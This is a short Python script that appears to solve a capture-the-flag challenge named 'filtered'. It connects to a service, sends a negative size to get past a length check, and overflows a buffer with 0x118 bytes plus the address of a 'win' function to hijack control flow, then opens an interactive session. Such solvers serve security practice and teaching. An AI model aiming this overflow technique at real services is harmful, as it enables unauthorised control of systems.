from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9001")

elf = ELF("../distfiles/filtered")
#sock = Process("../distfiles/filtered")
sock = Socket(HOST, int(PORT))

payload  = b'A' * 0x118
payload += p64(elf.symbol('win'))
sock.sendlineafter("Size: ", "-1")
sock.sendlineafter("Data: ", payload)

sock.interactive()
